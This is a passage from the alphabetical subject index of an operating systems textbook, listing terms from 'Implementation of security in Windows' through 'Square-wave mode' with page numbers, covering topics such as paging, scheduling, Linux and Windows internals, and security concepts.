Implementation of security in Windows, 970-975
Implementation of the file system in Linux, 784-792
Implementation of the NT file system in Windows, 954-964
Implementation of the object manager in Windows, 894-896
Implementing directories, 288-291
Implementing files, 282-287
Implicit intent, Android, 837
Import address table, 906
Imprecise interrupt, 350-351
IN instruction, 341
Incremental dump, 307
Indirect block, 324, 789-790
Indirection, 1007
Indium tin oxide, 415
Industry standard architecture, 32
Infrastructure as a service, 496
Init, 91, 809
InitializeAcl, 970
InitializeSecurityDescriptor, 970
InitOnceExecuteOnce, 919, 977
Inode, 784
Input software, 394-399
Input/Output, 45
Insider attacks, 657-660
Instruction backup, 235-236
Integer overflow attack, 654
Integrated circuit, 10
Integrated drive electronics, 369
Integrity checker, 691
Integrity level, 969
Integrity star property, 615
Integrity-level SID, 971
Intent, Android, 836-837
Intent resolution, 837
Interconnection network, omega, 523-524 perfect shuffle, 523
Interconnection technology, 546
Interface definition language, 582
Interfaces to Linux, 724-725
Interfacing for device drivers, 362-363
Interleaved memory, 525
Internal fragmentation, 226
Internet, 571-572
Internet interorb protocol, 583
Internet protocol, 574, 770
Interpretation, 700-701
Interpreter, 475
Interprocess communication, 40, 119-149 Windows, 916-917
Interrupt, 30, 347-351
imprecise, 350-351
precise, 349-351
Interrupt controller, 31
Interrupt flag, 482
Interrupt handler, 356-357
Interrupt remapping, 491-492

Interrupt service routine, 883
Interrupt vector, 31, 94, 348
Interrupt-driven I/O, 354-355
Introduction to scheduling, 150
Intruder, 599
Intrusion detection system, 687, 695
model-based, 695-697
Invalid page, Windows, 929
Inverted page table, 207-208
IoCallDrivers, 948-949
IoCompleteRequest, 948, 961, 962
Ioctl, 770, 771
IopParseDevice, 902, 903
iOS, 19
IP (see Internet Protocol)
IP address, 574
IPC (see InterProcess Communication)
iPhone, 19
IPSec, 619
Iris recognition, 637
IRP (see I/O Request Packet)
ISA (see Industry Standard Architecture)
ISO 9660 file system, 326-331
ISR (see Interrupt Service Routine)
ITO (see Indium Tin Oxide)

## K

KDE, 18
Kerckhoffs’ principle, 620
Kernel, Windows, 877, 882
Kernel handle, 897
Kernel lock, 533
Kernel mode, 1
Kernel rootkit, 680
Kernel thread, 997
Kernel-mode driver framework, 949
Kernel-space thread, 111-112
Kernel32.dll, 922
Kernighan, Brian, 715
Key
object type Windows, 894
file, 268
Key. cryptographic, 620
Keyboard software, 394-398
Keylogger, 661
Kildall, Gary, 14-15
Kill, 54, 59, 91, 739
KMDF (see Kernel-Mode Driver Framework)
Kqueues, 904
KVM, 474

## J

Jacket (around system call), 110
Jailing, 694-695
Java Development Kit, 702
Java security, 701
Java Virtual Machine, 72, 700, 702
JBD (see Journaling Block Device)
JDK (see Java Development Kit)
Jiffy, 747
JIT compilation (see Just-In-Time compilation)
Job, 8
Windows, 909-911
Job management API calls, Windows, 914-919
Jobs, Steve, 16, 405
Joliet extensions, 330-331
Journal, 874
Journaling, NTFS, 963
Journaling block device, 791
Journaling file system, 295, 295-296, 790-792
Just-in-time compilation, 814
JVM (see Java Virtual Machine)

## L

L1 cache, 26
L2 cache, 26
LAN (see Local Area Network)
Laptop mode, Linux, 767
Large scale integration, 15
Large-address-space operating system, 1024-1025
Late binding, 1001
Layered system, 64, 993-994
Layers of I/O software, 368
LBA (see Logical Block Addressing)
LDT (see Local Descriptor Table)
Least auhority, principle
Least recently used, simulation in software, 214
Least recently used page replacement algorithm, 213-214, 935
LeaveCriticalSection, 918
Library rootkit, 681
Licensing issues for virtual machines, 494-495
Lightweight process, 103

Limit register, 186
Limits to clock speed, 517
Linda, 584-587
Line discipline, 774
Linear address, 250
Link, 54, 57, 58, 280, 783
file, 291, 777
Linked lists for memory management, 192-194
Linked-list allocation, 284
Linked-list allocation using a table in memory, 285
Linker, 76
Linux, 14, 713-802
history, 720-722
overview, 723-733
Linux booting, 751
Linux buddy algorithm, 762
Linux dentry data structure, 784
Linux elevator algorithm, 773
Linux ext2 file system, 785-790
Linux ext4 file system, 790-792
Linux extensions for Android, 810-814
Linux file system, 775-798
implementation, 784-792
introduction, 775-780
Linux file-system calls, 780-783
Linux goals, 723
Linux header file, 730
Linux I/O, 767-775
implementation, 771-774
introduction, 767-769
Linux I/O scheduler, 773
Linux I/O system calls, 770-771
Linux interfaces, 724-725
Linux journaling file system, 790-792
Linux kernel structure, 731-733
Linux layers, 724
Linux laptop mode, 767
Linux loadable module, 775-76
Linux login, 752
Linux memory allocation, 761-763
Linux memory management, 753-767
implementation, 758-764
introduction, 754-756
Linux memory management system calls, 756-758
Linux networking, 769-770
Linux O(1) scheduler, 747
Linux page replacement algorithm, 765-767
Linux paging, 764-765
Linux pipe, 735
Linux process, 733-753
implementation, 740-746
introduction, 733-736
Linux process creation, 735
Linux process management system calls, 736-739
Linux process scheduling, 746-751
Linux processes, implementation, 740-746
Linux runqueue, 747
Linux security, 798-802
implementation, 801-802
Linux security system calls, 801
Linux signal, 735-736
Linux slab allocator, 762
Linux synchronization, 750-751
Linux system call, file-system calls, 780-783
I/O, 770-771
memory management, 756-758
process management, 736-739
security, 801
Linux system calls (see Access, Alarm, Brk, Chdir, Chmod, Chown, Clone, Close, Closedir, Creat, Exec, Exit, Fstat, Fsuid, Fsync, Getpid, Ioctl, Kill, Link, Lseek, Mkdir, Mmap, Mount, Munmap, Nice, Open, Opendir, Pause, Pipe, Read, Rename, Rewinddir, Rmdir, Select, Setgid, Setuid, Sigaction, Sleep, Stat, Sync, Time, Unlink, Unmap, Wait, Waitpid, Wakeup, Write)
Linux task, 740
Linux thread, 743-746
Linux timer, 747
Linux utility programs, 729-730
Linux virtual address space, 763-764
Linux virtual file system, 731-732, 784-785
Live migration, 497
Livelock, 461-463
Load balancing, multicomputer, 563-566
Load control, 225
Loadable module, Linux, 775-776
Local area network, 568
Local descriptor table, 249
Local page replacement, 222-223
Local procedure call, 867
Local vs. global allocation policy, 222
Locality of reference, 216
Location independence, 580
Location transparency, 579
Lock variable, 123
Lock-and-key memory protection, 185

Locking, 778-779
Locking pages in memory, 237
Log-structured file system, 293-293
Logic bomb, 657-658
Logical block addressing, 371
Logical dump, file system, 309
Login Linux, 752
Login spoofing, 659-660
LookupAccountSid, 970
Loosely coupled distributed system, 519
Lord Byron, 7
Lottery scheduling, 163
Lovelace, Ada, 7
Low-level communication software, 550-552
Low-level format, 375
Low-rights IE, 971
LPC (see Local Procedure Call)
LRU (see Least Recently Used page replacement)
LRU block cache, 315
Lseek, 54, 57, 83, 297, 744, 745, 782
LSI (see Large Scale Integration)
Lukasiewicz, Jan, 408

## M

Mac, 33
Mac OS X, 16
Machine physical address, 488
Machine simulator, 71
Macro, 74
Macro virus, 671
Magic number, file, 269
Magnetic disk, 369-371
Mailbox, 145
Mailslot, 916
Mainframe, 8
Mainframe operating system, 35
Major device, 768
Major device number, 363
Major page fault, 204
Making single-threaded code multithreaded, 116-119
Malloc, 652, 757
Malware, 639, 660-684
keylogger, 661
rootkit, 680-684
spyware, 676-680
Trojan horse, 663-664
Malware (continued)
virus, 664-674
worm, 674-676
Managing free memory, 190-194
Mandatory access control, 612
Manycore chip, 528-529, 1023-1024
Mapped file, 231
Mapped page writer, 941
Maroochy Shire sewage spill, 598
Marshalling, 552, 557, 822
Master boot record, 281, 378, 751
Master file table, 954
Master-slave multiprocessor, 532-533
Mauchley, William, 7
MBR (see Master Boot Record)
MDL (see Memory Descriptor List)
Mechanism, 67
Mechanism vs. policy, 165, 997-998
Memory, 24-27
interleaved, 525
Memory compaction, 189
Memory deduplication, 489, 494
Memory descriptor list, 950
Memory hierarchy, 181
Memory management, 181-254
Linux, 753-767
Windows, 927-942
Memory management algorithm
best fit algorithm, 193
first fit, 192
next fit algorithm, 192
quick fit algorithm, 193
worst fit algorithm, 193
Memory management API calls in Windows, 931-932
Memory management system calls in Linux, 756
Memory management unit, 28, 196
I/O, 491
Memory management with bitmaps, 191
Memory management with linked lists, 192-194
Memory management with overlays, 194
Memory manager, 181, 889
Memory migration, pre-copy, 497
Memory overcommitment, 489
Memory page, 194
Memory pressure, 938
Memory virtualization, 486-490
Memory-allocation mechanism, Linux, 761-763
Memory-mapped file, 756
Memory-mapped I/O, 340-344
Memory-resident virus, 669

Mesh, multicomputer, 547
Message passing, 144-146
Message-passing interface, 146
Metadata, file, 271
Metafile, Windows, 412
Method, 407, 582
Metric units, 79-80
MFT (see Master File Table)
Mickey, 399
Microcomputer, 15
Microkernel, 65-68, 995-997
Microkernels vs. hypervisors, 483-485
Microsoft Development Kit, 865
Microsoft disk operating system, 15
Middleware, 568
document-based, 576-577
file-system-based, 577-582
object-based, 582-584
Migration, live, 497
Mimicry attack, 697
Miniport, 893
MINIX, 14
history, 719-720
MINIX 3, 66-68, 719-720
MINIX file system, 775-776, 785-786
Minor device, 59, 768
Minor device number, 363
Minor page fault, 204
MinWin, 863
Missing block, 312
Mitigation, 973
Mkdir, 54, 57, 783
Mmap, 654, 757, 813, 853
MMU (see Memory Management Unit)
Mobile code, 698
encapsulating, 697-703
Mobile computer, 19-20
Model-based intrusion detection, 695-697
static, 695
Modeling multiprogramming, 95-97
Modern software development kit, 865
Modified bit, 200
ModifiedPageWriter, 939, 941
Modules in Linux, 774
Monitor, 137-144
Monitor/mwait instruction, 539
Monoalphabetic substitution cipher, 620
Monolithic operating system, 63-64
Moore, Gordon, 527
Moore’s law, 527
Morris, Robert, 674-676
Morris worm, 674-676
Motif, 402
Mount, 43, 54, 58, 59, 796
Mounted device, 351
Mouse software, 398-399
MPI (see Message-Passing Interface)
MS-DOS, 15, 16, 320, 858
MSDK (see Microsoft Development Kit)
Multicomputer, 545-566
Multicomputer hardware, 546-550
Multicomputer load balancing, 563-566
Multicomputer scheduling, 563
Multicomputer topology, 547-549
Multicore chip, 527-530
heterogeneous, 529-530
programming, 530
Multicore CPUs, virtualization
MULTICS (see MUltiplexed Information and computing service)
Multilevel page table, 205-207
Multilevel security, 612-615
Multiple processor systems, 517-589
Multiple programs without memory abstraction, 183
Multiple queue scheduling, 161
Multiplexed information and computing service 13, 49, 50, 65, 243-247, 714
Multiplexing, resource, 6
Multiprocessor, 86-87, 520-545
directory-based, 525-527
master-slave, 532-533
NUMA, 525-527
omega network, 523-524
shared-memory, 520-545
space sharing, 542-543
symmetric, 533-534
UMA, 520-525
Multiprocessor hardware, 520-530
Multiprocessor operating system, 36, 531-534
Multiprocessor scheduling, 539-545
affinity, 541
co-scheduling, 544
gang, 544-545
smart, 541
two-level, 541
Multiprocessor synchronization, 534-537
Multiprogramming, 11, 86, 95-97
Multiqueue network cards, 551
Multistage switching network, 523-525
Multithreaded and multicore chip, 23

Multithreaded Web server, 100-101
Multithreaded word processor, 99-100
Multithreading, 23-24, 103
Multitouch, 415
Munmap, 757
Murphy’s law, 120
Mutation engine, 690
Mutex, 132-134
Mutexes in Pthreads, 135-137
Mutual exclusion, 121
busy waiting, 124
disabling interrupts, 122-123
lock variable, 123
Peterson’s solution, 124-125
priority inversion, 128
sleep and wakeup, 127-130
spin lock, 124
strict alternation, 123-124
TSL instruction
Mutual exclusion with busy waiting, 122
Mythical man month, 1018-1019

## N

Naming, 999-1001
Naming transparency, 579-580
National Security Agency, 13
Native NT, API, 868-871
NC-NUMA (see Non Cache-coherent NUMA)
Nested page table, 488
Netbook, 862
Network, nonblocking, 522
Network device, 774
Network File System, 297, 792-798
Network File System architecture, 792-793
Network File System implementation, 795-798
Network File System protocol, 794-795
Network File System V4, 798
Network hardware, 568-572
Network interface, 548-550
Network operating system, 18
Network processor, 530, 549-550
Network protocol, 574, 574-576
Network services, 572-574
Networking, Linux, 769-770
Next fit algorithm, 192
NFS (seeNetwork File System)
NFS implementation, 795
NFU (see Not Frequently Used algorithm)
Nice, 747, 852
No memory abstraction, 181-185
Node-to-network interface communication, 551-552
Non cache-coherent NUMA, 525
Nonblocking call, 554-556
Nonblocking network, 522
Noncanonical mode, 395
Nonce, 626
Noncontrol-flow diverting attack, 648-649
Nonpreemptable resource, 437
Nonpreemptive scheduling, 153
Nonrepudability, 596
Nonresident attribute, 956
Nonuniform memory access, 520, 925
Nonvolatile RAM, 387
Nop sled, 642
Not frequently used page replacement algorithm, 214
Not recently used page replacement algorithm, 210-211
Notification event, Windows, 918
Notification object, 886
NRU (see Not Recently Used page replacement)
NSA (see National Security Agency)
NT file system, 265-266
NT namespace, 870
NtAllocateVirtualMemory, 869
NtCancelIoFile, 947
NtClose, 900, 901
NtCreateFile, 869, 901, 946, 947
NtCreateProcess, 867, 869, 915, 922, 978, 979
NtCreateThread, 869, 915
NtCreateUserProcess, 916, 919, 920, 921, 922
NtDeviceIoControlFile, 947
NtDuplicateObject, 869
NtFlushBuffersFile, 947
NTFS (see NT File System)
NtFsControlFile, 947, 963
NtLockFile, 947
NtMapViewOfSection, 869
NtNotifyChangeDirectoryFile, 947, 963
Ntoskrnl.exe, 864
NtQueryDirectoryFile, 946
NtQueryInformationFile, 947
NtQueryVolumeInformationFile, 947
NtReadFile, 899, 946
NtReadVirtualMemory, 869
NtResumeThread, 916, 922
NtSetInformationFile, 947
NtSetVolumeInformationFile, 947
NtUnlockFile, 947

NtWriteFile, 899, 946
NtWriteVirtualMemory, 869
Null pointer dereference attack, 653
NUMA (see NonUniform Memory Access)
NUMA multiprocessor, 525-527
NX bit, 644

## O

ObCreateObjectType, 903
Object, 582
security, 605
Object adapter, 583
Object cache, 762
Object file, 75
Object manager, 870, 888
Object manager implementation, 894-896
Object namespace, 898-905
Object request broker, 582
Object-based middleware, 582-584
ObOpenObjectByName, 901
Off line operation, 9
Omega network, 523-524
One-shot mode, clock, 389
One-time password, 631
One-way function, 609, 622
One-way hash chain, 631
Ontogeny recapitulates phylogeny, 47-50
Open, 54, 56, 57, 116, 272, 278, 297, 320, 333, 366, 437, 443, 608, 696, 718, 768, 781, 785, 786, 795, 796, 798
Open-file-description table, 789
Opendir, 280
OpenGL, 529
OpenSemaphore, 897
Operating system
Android, 802-849
BSD, 717-718
embedded, 37
guest, 477
handheld device, 36
history, 6-20
host, 477
Linux, 713-802
mainframe, 35
MD-DOS, 858
Me, 859
MINIX, 14, 66-68, 719-720, 775-776, 785-786
monolithic, 63-64
MS-DOS, 858
multiprocessor, 36
OS/2, 859
PDP-11, 715-716
personal computer, 36
real time, 37-39
sensor node, 27
server, 35-36
smart card, 38
System V, 717
UNIX, 14
UNIX 32V, 717
UNIX v7 323-325
Vista, 862-863
Win32, 860
Windows 2000, 17, 861
Windows 3.0, 860
Windows 7, 863, 863-864
Windows 8, 857-976
Windows 95, 16, 859
Windows 98, 16, 859
Windows ME, 17, 859
Windows NT, 16, 859, 860
Windows NT 4.0, 861
Windows Vista, 17, 862-863
Windows XP, 17, 861
Operating system as a resource manager, 5-6
Operating system as an extended machine, 4-5
Operating system concepts, 38-50
Operating system defined, 1
Operating system design, 981-1027
difficulties, 983-985
goals, 982-983
interfaces, 985-993
principles, 985-987
system-call interface, 991-993
trends, 1022-1026
useful techniques, 1005-1010
Operating system implementation, 993-1010
Operating system issues for power management, 419-425
Operating system paradigm, 987-983
Operating system performance, 1010-1018
caching, 1015-1016
exploiting locality, 1017
hints, 1016
optimize the common case, 1017-1018
space-time trade-offs, 1012-1015

Operating system structure, 62-73, 993-997
client-server, 68
client-server system, 995-997
exokernel, 73, 995
extensible system, 997
layered, 64-65
layered system, 993-994
microkernel, 65-68
virtual machine, 69-72
Operating system type, 35-38
Operating systems security, 599-602
Optimal page replacement algorithm, 209-210
Optimize the common case, 1017
ORB (see Object Request Broker)
Orthogonality, 998-999
OS X, 16
OS/2, 859
OS/360, 11
Ostrich algorithm, 443
Out instruction, 341
Out-of-memory killer, Android, 813-814
Output software, 399-416
Overcommitting memory, 489
Overlapped seek, 369
Overlay, 194
Overwriting virus, 666

## P

P operation on semaphore, 130
PAAS (see Platform As A Service)
Package manager, Android, 826
Packet switching, 547-548
PAE (see Physical Address Extension)
Page, memory, 194, 196
Page allocator, Linux, 761
Page daemon, Linux, 764
Page descriptor, Linux, 760
Page directory, 207, 251
Page directory pointer table, 207
Page fault, 198
guest-induced, 487
hypervisor-induced, 487
major, 204
minor, 204
Page fault frequency page replacement algorithm, 224
Page fault handling, 233-235
Page frame, 196
Page frame number, 200
Windows, 939
Page frame number database, Windows, 939
Page frame reclaiming algorithm, 764, 765
Page map level 4, 207
Page replacement algorithm, 209-222
aging, 214
clock, 212-213
first-in, first-out, 211
global, 223-224
least recently used, 213-214
Linux, 765-767
local, 222-223
not frequently used, 214
not recently used, 210-211
optimal, 209-210
page fault frequency, 224-225
second-chance, 212
summary, 221
Windows, 937-939
working set, 215
WSClock, 219
Page sharing, content-based, 494
transparent, 494
Page size, 225-227
Page table, 196-198, 198-201
extended, 488
large memory, 205-208
multilevel, 205-207
nested, 488
shadow, 486
Page table entry, 199-201
Windows, 937
Page-fault handling, Windows, 934-937
Page table walk, 204
Pagefile, Windows, 930-931
Paging, 195-208
algorithms, 209-222
basics, 195-201
copy on write, 229
design issues, 222-233
fault handling, 233-235
implementation issues, 233-240
instruction backup, 235-236
large memories, 205-208
Linux, 764-765
locking pages, 237
separation of policy and mechanism, 239-240
shared pages, 228-229

Paging daemon, 232
Paradigm, data, 989-991
operating system, 987-993
Parallel bus architecture, 32
Parallels, 474
Parasitic virus, 668
Paravirt op, 485
Paravirtualization, 72, 476, 483
Parcel, Android, 821
Parent process, 90, 734
Parse routine, 898
Partition, 59, 879
Passive attack, 600
Password security, 628-632
Password strength, 628-629
Patchguard, 974
Path name, 43, 277-280
absolute, 277
relative, 278
Pause, 93, 739
PC, 15
PCI bus (see Peripheral Component Interconnect)
PCIe (see Peripheral Component Interconnect Express)
PCR (see Platform Configuration Register)
PDA (see Personal Digital Assistant)
PDE (see Page-Directory Entry)
PDP-1, 14
PDP-11, 49
PDP-11 UNIX, 715
PEB (see Process Environment Block)
Per-process items, 104
Per-thread items, 104
Perfect shuffle, 523
Performance, 1010-1018
caching, 1015-1016
exploiting locality, 1017
file system, 314-319
hints, 1016
optimize the common case, 1017-1018
space-time trade-offs, 1012-1015
Periodic real-time system, 164
Peripheral component interconnect, 32
Peripheral component interconnect express, 32-33
Persistence, file, 264
Personal computer operating system, 36
Personal digital assistant, 36
Personal firewall, 687
Peterson’s algorithm, 124-125
PF (see Physical Function)
PFF (see Page Fault Frequency algorithm)
PFN (see Page Frame Number)
PFRA (see Page Frame Reclaiming Algorithm)
Phase-change memory, 909
Physical address, guest, 488
host, 488
Physical address extension, 763
Physical dump, file system, 308
Physical function, 493
Physical memory management, Linux, 758-761
Windows, 939-942
PID (see Process IDentifier)
Pidgin Pascal, 137
Pinned memory, 759
Pinning pages in memory, 237
Pipe, 44, 782
Linux, 735
Pipeline, 21
PKI (see Public Key Infrastructure)
Plaintext, 620
Platform as a service, 496
Platform configuration register, 625
PLT (see Procedure Linkage Table)
Plug and play, 33, 889
Pointer, 74
POLA (see Principle of Least Authority)
Policy, 67
Policy vs. mechanism, 165, 997-998
paging, 239-240
Polling, 354
Polymorphic virus, 689-691
Pop-up thread, 114-115, 556
Popek, Gerald, 474
Port number, 686
Portable C compiler, 716
Portable UNIX, 716-717
Portscan, 597
Position-independent code, 231
POSIX, 14, 50-62, 718
POSIX threads, 106-108
Power management, 417-426
application issues, 425-426
battery, 424-425
CPU, 421-423
display, 420
driver interface, 425
hard disk, 420-421
hardware issues, 418-419
memory, 423
operating system issues, 419-425

Power management (continued)
thermal management, 424
Windows, 964-966
wireless communication, 423-424
PowerShell, 876
Pre-copy memory migration, 497
Preamble, 340
Precise interrupt, 349-351
Preemptable resource, 436
Preemptive scheduling, 153
Prepaging, 216
Present/absent bit, 197, 200
Primary volume descriptor, 327
Principal, security, 605
Principle of least authority, 603
Principles of operating system design, 985-987
Printer daemon, 120
Priority inversion, 128, 927
Priority scheduling, 159-161
Privacy, 596, 598
Privileged instruction, 475
Proc file system, 792
Procedure linkage table, 645
Process, 39-41, 85-173, 86
blocked, 92
CPU-bound, 152
I/O-bound, 152
implementation, 94-95
Linux, 740-746
ready, 92
running, 92
Windows, 908-927
Process behavior, 151-156
Process control block, 94
Process creation, 88-90
Process dependency, Android, 847
Process environment block, 908
Process group, Linux, 735
Process hierarchy, 91-92
Process ID, 53
Process identifier, Linux, 734
Process lifecycle, Android, 846
Process management API calls in Windows, 914-919
Process management system calls, 53-56
Process management system calls in Linux, 736-739
Process manager, 889
Process model, 86-88
Android, 844
Process scheduling
Linux, 746-751
Windows, 922-927
Process state, 92
Process switch, 159
Process table, 39, 94
Process termination, 90-91
Process vs. program, 87
Process-level virtualization, 477
Processes in Linux, 733-753
Processor, 21-24
Processor allocation algorithm, 564-566
graph-theoretic, 564-565
receiver-initiated, 566
sender-initiated, 565-566
ProcHandle, 869
Producer-consumer problem, 128-132
with messages, 145-146
with monitors, 137-139
with semaphores, 130-132
Program counter, 21
Program status word, 21
Program vs. process, 87
Programmed I/O, 352-354
Programming with multiple cores , 530
Project management, 1018-1022
Prompt, 46
Proportionality, 155
Protected process, 916
Protection, file system, 45
Protection command, 611
Protection domain, 603-605
Protection hardware, 48-49
Protection mechanism, 596
Protection ring, 479
Protocol, 574
communication, 460
NFS, 794
Protocol stack, 574
Pseudoparallelism, 86
PSW (see Program Status Word)
PTE (see Page Table Entry)
Pthreads, 106-108
function calls, 107
mutexes, 135-137
Public key infrastructure, 624
Public-key cryptography, 621-622
Publish/subscribe, model, 586
PulseEvent, 919
Python, 73

## Q

Quality of service, 573
Quantum, scheduling 158
QueueUserAPC, 885
Quick fit algorithm, 193

## R

R-node, NFS, 796
Race condition, 119-121, 121, 656
RAID (see Redundant Aray of Inexpensive Disks)
RAM (see Random Access Memory)
Random access memory, 26
Random-access file, 270
Raw block file, 774
Raw mode, 395
RCU (see Read-Copy-Update)
RDMA (see Remote DMA)
RDP (see Remote Desktop Protocol)
Read, 23, 39, 50, 50-51, 51, 54, 57, 60, 67, 100, 101, 106, 110, 111, 174, 271, 273, 275, 280, 297, 298, 299, 352, 363, 580, 581, 603, 696, 718, 725, 747, 756, 767, 768, 781, 782, 785, 788, 789, 795, 796, 797, 802
Read ahead, block, 317-318
NFS, 797
Read only memory, 26
Read-copy-update, 148-149
Read-side critical section, 148
Readdir, 280, 783
Readers and writers problem, 171-172
ReadFile, 961
Ready proces, 92
Real time, 390
Real-time, hard, 38
soft, 38
Real-time operating system, 37-38, 164
aperiodic, 165
periodic, 164
Real-time scheduling, 164-167
Recalibration, disk, 384
Receiver, Android, 833-834
Receiver-initiated processor allocation, 566
Reclaiming memory, 488-490
Recovery console, 894
Recovery through killing processes, 450
Recycle bin, 307
Red queen effect, 639
Redirection of input and output, 46
Redundant array of inexpensive disks, 371-375
levels, 372
striping, 372
Reentrancy, 1009
Reentrant code, 118, 361
Reference monitor, 602, 700
Referenced bit, 200
Referenced pointer, 896
ReFS (see Resilient File System)
Regedit, 876
Registry, Windows, 875-877
Regular file, 268
Reincarnation server, 67
Relative path, 777
Relative path name, 278
ReleaseMutex, 918
ReleaseSemaphore, 918
Releasing dedicated devices, 366
Relocation, 184
Remapping, interrupt, 491-492
Remote attestation, 625
Remote desktop protocol, 927
Remote direct memory access, 552
Remote procedure call, 556-558, 816, 864 implementation, 557-558
Remote-access model, 577
Rename, 273, 280, 333
Rendezvous, 145
Reparse point, 954
NTFS, 961
Replication in DSM, 561
Request matrix, 446
Request-reply service, 573
Requirements for virtualization, 474-477
Research, deadlocks, 464
file systems, 331-332
input/output, 426-428
memory management, 252-253
multiple processor systems, 587-588
operating systems , 77-78
processes and threads, 172-173
security, 703-704
virtual machine, 514-515
Research on deadlock, 464
Research on file systems, 331
Research on I/O, 426-427
Research on memory management, 252
Research on multiple processor systems, 587

Research on operating systems, 77-78
Research on security, 703
Research on virtualization and the cloud, 514
Reserved page, Windows, 929
ResetEvent, 918
Resilient file system, 266
Resistive screen, 414
ResolverActivity, 837
Resource, 436-439
nonpremptable, 437
preemptable, 436
X, 403
Resource access, 602-611
Resource acquisition, 437-439
Resource allocation graph, 440-441
Resource deadlock, 439
conditions for, 440
Resource graph, 445
Resource trajectory, 450-452
Resource vector
available, 446
existing, 446
Response time, 155
Restricted token, 909
Return-oriented programming, 645-647, 973
Return to libc attack, 645-647, 973
Reusability, 1008
Rewinddir, 783
Right, 603
RIM Blackberry, 19
Ritchie, Dennis, 715
Rivest-Shamir-Adelman cipher, 622
Rmdir, 54, 57, 783
Rock Ridge extensions, 329-331
Role, ACL, 606
Role of experience, 1021
ROM (see Read Only Memory)
Root, 800
Root directory, 43, 276
Root file system, 43
Rootkit, 680-684, application
blue pill, 680
firmware, 680
hypervisor, 680
kernel, 680
library, 681
Sony, 683-684
Rootkit detection, 681-683
ROP (see Return-Oriented Programming)
Round-robin scheduling, 158-159
Router, 461,571
RPC (see Remote Procedure Call)
RSA cipher (see Rivest-Shamir-Adelman cipher)
Running process, 92
Runqueue, Linux, 747
Rwx bit, 45

## S

SAAS (see Software As A Service)
SACL (see System Access Control List)
Safe boot, 894
Safe state, 452-453
Safety, hypervisor, 475
Salt, 630
SAM (see Security Access Manager)
Sandboxing, 471, 698-700
SATA (see Serial ATA)
Scan code, 394
Schedulable real-time system, 165
Scheduler, 149
Scheduler activation, 113-114, 912
Scheduling, 149-167
introduction, 150-156
multicomputer, 563
multiprocessor, 539-545
real-time, 164-167
thread, 166-167
when to do, 152
Scheduling algorithm, 149, 153
aging, 162
batch system, 156-158
categories, 153
fair-share, 163-164
first-come, first-served, 156-157
goals, 154-156
guaranteed, 162
interactive system, 158-164
introduction, 150-156
lottery, 163
multiple queues, 161
nonpreemptive, 153
priority, 159-161
round-robin, 158-159
shortest job first, 157-158
shortest process next, 162
shortest remaining time next, 158
Scheduling group, 927

Scheduling mechanism, 165
Scheduling of processes
Linux, 746-751
Windows, 922-927
Scheduling policy, 165
Script kiddy, 599
Scroll bar, 406
SCSI (see Small Computer System Interface)
SDK (see Software Development Kit)
Seamless data access, 1025
Seamless live migration, 497
Second system effect, 1021
Second-chance page replacement algorithm, 212
Secret-key cryptography, 620-621
Section, 869, 873
SectionHandle, 869
Secure hash algorithm, 623
Secure virtual machine, 476
Security, 593-705
Android, 838-844
authentication, 626-638
controlling access. 602-611
defenses against malware, 684-704
insider attacks, 657-660
outsider attacks, 639-657
password, 628-632
use of cryptography, 619-626
Security access manager, 875
Security calls
Linux, 801
Windows, 969-970
Security by obscurity, 620
Security descriptor, 868, 968
Security environment, 595-599
Security exploit, drive-by-download, 639
Security ID, 967
Security in Linux, 798-802
introduction, 798-800
Security in Windows, 966-975
Security mitigation, 973
Security model, 611-619
Security reference monitor, 890
Security system calls in Linux, 801
Seek, 271
Segment, 241
Segmentation, 240-252
implementation, 243
Intel x86, 247-252
MULTICS, 243-247
Segmentation fault, 205
Select, 110, 111, 175
Self-map, 921
Semantics of file sharing, 580-582
Semaphore, 130, 130-132
Send and receive, 553
Sender-initiated processor allocation, 565-566
Sensitive instruction, 475
Sensor-node operating system, 37
Separate instruction and data space, 227-28
Separation of policy and mechanism, 165, 997-998 paging, 239-240
Sequential access, 270
Sequential consistency, 580-581
Sequential consistency in DSM, 562-563
Sequential process, 86
Serial ATA, 4, 29
Serial ATA disk, 369
Serial bus architecture, 32
Server, 68
Server operating system, 35-36
Server stub, 557
Service, Android, 831-833
Service pack, 17
Session semantics, 582
SetEvent, 918, 919
Setgid, 802
SetPriorityClass, 923
SetSecurityDescriptorDacl, 970
SetThreadPriority, 923
Setuid, 604, 802, 854
Setuid bit, 800
Setuid root programs, 641
Sewage spill, 598
Sfc, 312
SHA (see Secure Hash Algorithm)
SHA-1 (see Secure Hash Algorithm)
SHA-256 (see Secure Hash Algorithm)
SHA-512 (see Secure Hash Algorithm)
Shadow page table, 486
Shared bus architecture, 32
Shared files, 290-293
Shared hosting, 70
Shared library, 63, 229-231
Shared lock, 779
Shared page, 228-229
Shared text segment, 756
Shared-memory multiprocessor, 520-545
Shell, 1-2, 39, 45-46, 726-728
Shell filter, 727
Shell magic character, 727

Shell pipe symbol, 728
Shell pipeline, 728
Shell prompt, 726
Shell script, 728
Shell wild card, 727
Shellcode, 642
Shim, 922
Short name, NTFS, 957
Shortest job first scheduling, 157-158
Shortest process next scheduling, 162
Shortest remaining time next scheduling, 158
Shortest seek first disk scheduling, 380
SID (see Security ID)
Side-by-side DLLs, 906
Side-channel attack, 636
Sigaction, 739
Signal, 139, 140, 356
alarm, 40
Linux, 735-736
Signals in multithreaded code, 118
Signature block, 623
Silver bullet, lack of, 1022
SIMMON, 474
Simonyi, Charles, 408
Simple integrity property, 615
Simple security property, 613
Simulating LRU in software, 214
Simultaneous peripheral operation on line, 12
Single indirect block, 324, 789
Single interleaving, 378
Single large expensive disk, 372
Single root I/O virtualization, 492-493
Single-level directory system, 276
Singularity, 907
Skeleton, 582
Skew, disk, 376
Slab allocator, Linux, 762
SLED (see Single Large Expensive Disk)
Sleep, 128, 130, 140, 179
Sleep and wakeup, 127-130
Small computer system interface, 33
Smart card, 634
Smart card operating system, 38
Smart scheduling, multiprocessor, 541
Smartphone, 19-20
SMP (see Symmetric MultiProcessor)
Snooping, bus, 528
SoC (see System on a Chip)
Socket, 917
Berkeley, 769
Soft fault, 929, 936
Soft miss, 204
Soft real-time system, 38, 164
Soft timer, 392-394
Software as a service, 496
Software development kit, Android, 805
Software fault isolation, 505
Software TLB management, 203-205
Solid state disk, 28, 318
Sony rootkit, 683-684
Source code virus, 672
Space sharing, multiprocessor, 542-543
Space-time trade-offs, 1012-1015
Sparse file, NTFS, 958
Special file, 44, 767
block, 268
character, 268
Spin lock, 124, 536
Spinning vs. switching, 537-539
Spooler directory, 120
Spooling, 12, 367
Spooling directory, 368
Spyware, 676-680
actions taken, 679
browser hijacking, 679
drive-by-download, 677
Square-wave mode, clock, 389
